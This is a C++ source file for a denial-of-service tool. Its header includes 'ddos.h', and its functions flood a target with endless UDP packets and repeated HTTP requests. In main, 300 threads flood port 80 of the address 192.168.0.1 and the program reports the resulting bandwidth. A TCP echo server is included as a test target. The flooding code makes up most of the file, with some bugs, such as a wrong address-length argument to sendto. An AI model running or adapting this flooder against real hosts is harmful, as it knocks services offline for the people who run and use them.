//
//  main.cpp
//  CAddTest
//
//  Created by yfn on 2018/5/9.
//  Copyright © 2018年 infeini. All rights reserved.
//
#include "ddos.h"

void server(int port) {
    int socketId;
    if ((socketId = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        throw "socket创建失败";
    else
        log("socketId:" + std::to_string(socketId));

    struct sockaddr_in myAddress;
    myAddress.sin_family = AF_INET;
    myAddress.sin_port = htons(port);
    myAddress.sin_addr.s_addr = INADDR_ANY;
    bzero(&(myAddress.sin_zero), 8);
    if (bind(socketId, (struct sockaddr *) &myAddress, sizeof(struct sockaddr)) == -1)
        throw "server bind出错!";
    else
        log("server bind成功");

    if (listen(socketId, 8) == -1)
        throw "server listen出错";
    else
        log("server listen成功");

    struct sockaddr_in remoteAddress;
    int inLength;
    int bufferSize = 2048;
    char buffer[bufferSize];
    while (true) {
        try {
            int clientId;
            if ((clientId = accept(socketId, (struct sockaddr *) &remoteAddress, (socklen_t *) &inLength)) == -1)
                log("server 接受成功");
            else
                log("server 接收失败");
            int length;
            if ((length = read(clientId, buffer, bufferSize)) != -1) {
                buffer[length] = '\0';

                std::string logStr = "server 收到:(";
                logStr.append(std::to_string(length));
                logStr.append(")");
                logStr.append(buffer);
                log(logStr);
            } else throw "server 读取失败";
            std::string sendData = "hi";
            if (send(clientId, sendData.c_str(), sendData.length(), 0) == -1)
                throw "server 发送失败";
            else
                log("server 发送成功");
        }
        catch (const char *error) {
            std::string errorStr = "发生异常:";
            errorStr.append(error);
            log(errorStr);
        }
    }
}

float dataSize;

void clientHttp(const char *domain, int port, const char *path) {
    int socketId = socket(AF_INET, SOCK_STREAM, 0);
    struct hostent *host = gethostbyname(domain);
    if (socketId == -1)
        throw "client 创建socket失败";
    else
        log("client socketId:" + std::to_string(socketId));
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_port = htons(port);
    address.sin_addr = *((struct in_addr *) host->h_addr);
    int connectId = connect(socketId, (struct sockaddr *) &address, sizeof(struct sockaddr));
    if (connectId == -1)
        throw "client 连接失败";
    else
        log("client connectId:" + std::to_string(connectId));

    //模拟http请求
    std::string head = getHttpRequestData(domain, path);

    if (send(socketId, head.c_str(), head.length(), 0) == -1)
        throw "client 发送失败";
    else
        log("client 发送成功");
    long length;
    int bufferSize = 10240;
    char buffer[bufferSize];
    if ((length = recv(socketId, buffer, bufferSize, 0)) == -1)
        throw "client 接受数据错误";
    else {
        dataSize += length;
        buffer[length] = '\0';
        std::string logStr = "client 收到(";
        logStr.append(std::to_string(length));
        logStr.append("):");
        logStr.append(buffer);
        log(logStr.c_str());
    }
    close(socketId);
}

void clientUdp(const char *domain, int port) {
    int socketId = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in address;
    bzero(&address, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons(port);
    address.sin_addr = *((struct in_addr *) gethostbyname(domain)->h_addr);
    int sendBufferLength = 2;
    char sendBuffer[sendBufferLength];
    while (true) {
        try {
            sendto(socketId, sendBuffer, sendBufferLength, 0, (const sockaddr *) &address, sendBufferLength);
        }
        catch (const char *error) {
            std::cout << error;
        }
    }
}

void ddosHttp(const char *host, int port, const char *path) {
    while (1)
        try {
            clientHttp(host, port, path);
        } catch (const char *error) {
//            std::cout << error << std::endl;
        }
}

int main(int argc, const char *argv[]) {
    int threadNumber = 300;
    std::thread threads[threadNumber];
    std::cout << "thread number:" << threadNumber << std::endl;
    const char *attachHost = "192.168.0.1";
    for (int i = 0; i < threadNumber; i++)
        threads[i] = std::thread(clientUdp, attachHost, 80);
    while (true) {
        sleep(1);
        std::cout << "speed:" << dataSize / 1024 / 1024 << " Mb/s\t" << dataSize / 1024 << " Kb/s" << std::endl;
        dataSize = 0;
    }
}
